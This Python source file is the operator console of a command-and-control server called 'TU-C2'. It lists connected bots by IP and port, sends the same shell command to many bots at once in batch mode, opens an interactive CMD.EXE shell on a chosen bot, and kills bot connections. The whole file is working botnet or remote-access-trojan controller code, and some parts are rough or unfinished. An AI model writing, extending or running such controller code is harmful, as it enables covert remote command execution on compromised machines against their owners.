# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

# Project imports
# import handler
# from server import agentList
# from handler import Handler
# from server import batchList, aliveConnections, deadConnections, clientAddressList

class Interpreter(threading.Thread):
    def __init__(self, agentList, listeners, responseQueue):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        self.agentList = agentList
        self.listeners = listeners

    def run(self):
        # Start of a command history implementation, put on hold by fuuuuucking queueueueueues
        # cmd_history = []

        while True:

            # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
            
            cmd = str(input("[TU-C2:CONSOLE]$ ")).casefold()

            # TODO:
            # commands:
            #   - list-mods
            #   - info <bot-id>
            #   - beacon <bot-id>
            #
            # display:
            #   - usage-info^^^


            if (cmd == ""):
                print("[* Interpreter-Msg] Error: No command received. Try again...")
                pass
            elif (cmd == "exit"):
                self.exit()
            elif (cmd == "clear"):
                self.clearScreen()
            
            elif (cmd == "list-agents"):
                self.listAgents()
            # elif (cmd == "list-dead"):
            #     self.listDead()
            elif (cmd == "batch-mode"):
                self.batchMode()
            elif (cmd.startswith("kill")):
                try:
                    print(cmd)
                    arg_id = int(cmd.split()[1])
                    print(arg_id)
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                else:
                    try:
                        self.kill(arg_id)
                    except Exception as ex: 
                        print(f"[* Interpreter-Msg] Unable to kill connection with bot {arg_id}...")
                        print(f"[* Interpreter-Msg] Error: {ex}")
            elif (cmd.startswith("interact")):
                try:
                    print(cmd)
                    arg_id = int(cmd.split()[1])
                    print(arg_id)
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                else:
                    try:
                        self.interact(arg_id)
                    except Exception as ex: 
                        print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")
                        print(f"[* Interpreter-Msg] Error: {ex}")
            else:
                print("[* Interpreter-Msg] Unable to process command. Try again...")
                pass
            
                # print(f"[+] Sending Command: {cmd} to {str(len(allConnections))} + " bots")
                # for conn in activeConnections:                                         # for i in range(len(allConnections)):
                #     time.sleep(0.1)
                #     conn.execute(cmd)
#------------------------------------------------------------------------------------------------------------------------------
    def batchMode(self):
 
        batchList = []

        self.clearScreen()

        print("[* Interpreter-Msg] Entering Batch-Mode execution.\n")
        print("[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.")
        print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")

        bm_success = False
        bm_entry = ''

        # This loop is super shitty, fix it 
        while ('quit'.casefold() not in bm_entry):
            if(bm_success):
                break
            else:    
                try:
                    bm_entry = input('[* Interpreter-Msg] Enter list of Bot-IDs to interact with (seperated by spaces): ')
                    idlist = [int(n) for n in bm_entry.split()]
                    print(f"[* Interpreter-Msg] ID list obtained: {str(idlist)}")
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to form list of IDs to add to BatchMode-list")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                    bm_success = False
                else:
                    for conn in self.agentList:
                        if conn.getID() in idlist:
                            batchList.append(conn)
                    bm_success = True


        time.sleep(1)

        if(bm_success):
            self.clearScreen()
            print("[* Interpreter-Msg] Batch-Mode execution confirmed: ")
            print(f"[* Interpreter-Msg] The commands entered here will be sent to these Bots {idlist}")
            print("[* Interpreter-Msg] Note that this mode will not allow for individual shell environment interaction\n")
            print("[* Interpreter-Msg] Enter Q or QUIT at any time to exit this mode")
            print("[* Interpreter-Msg] Enter EXIT at any time to exit the C2\n\n")

            batch_cmd = ""

            while (True):
                batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                
                if(batch_cmd.casefold() == "quit" or batch_cmd.casefold() == "q"):
                    batchList.clear()
                    break
                elif (batch_cmd.casefold() == "exit"):
                    batchList.clear()
                    self.exit()
                elif (batch_cmd.casefold() == "shell"):
                    print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
                    print("[* Interpreter-Msg] Please exit if that is the desired result\n")
                    continue
                else:
                    try:
                        print(f"[+] Sending Command: {batch_cmd} to {str(len(batchList))} bots")
                        for conn in batchList:                                     
                            time.sleep(0.1)
                            print  
                            print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
                            print(conn.execute(batch_cmd))
                    except Exception as ex:
                        print(f"[* Interpreter-Msg] Error with sending command or receiving output: {ex}")
                        print(f"[* Interpreter-Msg] Error: {ex}")

        print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")

# #------------------------------------------------------------------------------------------------------------------------------

#     # Obsolete
#     def activate(self):
#         try:
#             selectedIDs = [int(n) for n in input('[+ Activation] Enter ID list to activate (seperated by spaces): ').split()]
#             print(f"[+ Activation] ID list obtained: {str(selectedIDs)}")
#         except Exception as ex:
#             print(f"[* Interpreter-Msg] Error with activation list: {ex}")
#             print(f"[* Interpreter-Msg] Error: {ex}")
#         else:
#             for conn in allConnections:
#                 #print("Handler: ", str(conn))

#                 if conn.getID() in selectedIDs:
#                     print("Activating Bot " + str(conn.getID()))
#                     conn.activate()
#                     activeConnections.append(conn)
# #------------------------------------------------------------------------------------------------------------------------------

#     # Obsolete  
#     def deactivate(self):
#         try:
#             deselectedIDs = [int(n) for n in input('[- Deactivation] Enter IDs to deactivate (seperated by spaces): ').split()]
#             print(f"[- Deactivation] ID list obtained: {str(deselectedIDs)}")
#         except Exception as ex:
#             print(f"[* Interpreter-Msg] Error with deactivation list: {ex}")
            
#         else:
#             for conn in allConnections:
#                 if conn.getID() in deselectedIDs and conn.isActivated():
#                     print(f"[* Deactivation] Deactivating Bot {str(conn.getID())}")
#                     conn.deactivate()
#                     activeConnections.remove(conn)
#------------------------------------------------------------------------------------------------------------------------------
    def exit(self):
        print(f"[* Interpreter-Msg] Closing connection to {str(len(self.agentList))} bots")
        for agent in self.agentList:                                         
            time.sleep(0.1)
            agent.execute("exit")

        print("[* Interpreter-Msg] Exiting connections for all bots. Please wait...")
        time.sleep(5)
        os._exit(0)
#------------------------------------------------------------------------------------------------------------------------------
    def listAgents(self): # Change to listAlive(self)
        print("       .------------------.                                    ")
        print("       |  LIST OF AGENTS  |                                    ")
        print(".------:------------------:-------.-------------.-------------.")
        print(":  ID  :  IP ADDRESS (v4) :  PORT : HOST-STATUS : CONN-STATUS :")
        print(":------:------------------:-------:-------------:-------------:")

        for agent in self.agentList:
            print("| %4d | %16s | %5d | %6s |"% (agent.getID(), agent.getIP(), agent.getPort(), agent.getStatus()))
            print(":------:------------------:-------:--------:")
#------------------------------------------------------------------------------------------------------------------------------

    # def listDead(self):
    #     print(".-------------------------.")
    #     print("| List of Dead Sessions   |")
    #     print(":--------------------------------.")

    #     for session in server.deadConnections:
    #         print("| %4d | %16s | %5d |"% (session[0], session[1], session[2]))
    #         print(":--------------------------------:")
#------------------------------------------------------------------------------------------------------------------------------
    # def listAll(self):
    #     print("---------------------------")
    #     print("| List of All Connections |")
    #     print("---------------------------")

    #     for conn in allConnections:
    #         print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
    #         print("---------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def clearScreen(self):
        os.system("clear")
#------------------------------------------------------------------------------------------------------------------------------
    def interact(self, id):
        # print("Shell function entry point")
        print(f"[* Interpreter-Msg] Entering individual interaction with Bot #{id}.\n")
        print("[* Interpreter-Msg] Be mindful that this mode is quite loud.")
        print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")

        shellExecStatus = False
        for agent in self.agentList:
            if agent.getID() == id:
                shellExecStatus = agent.shell()

        if shellExecStatus:
            print("[* Interpreter-Msg] Shell exited gracefully...\n")
        else:
            print("[* Interpreter-Msg] Shell exited with errors...\n")

    def kill(self, id):
        print(f"[* Interpreter-Msg] Killing connection with Bot #{id}.\n")

        for agent in self.agentList:
            if agent.getID() == id:
                killStatus = agent.kill()

        if killStatus:
            print(f"[* Interpreter-Msg] Bot #{id} was killed peacefully...\n")
            for agent in self.agentList:
                if agent.getID() == id:
                    self.agentList.remove(agent)
                    break
        else:
            print(f"[* Interpreter-Msg] Bot #{id} was killed with errors...\n")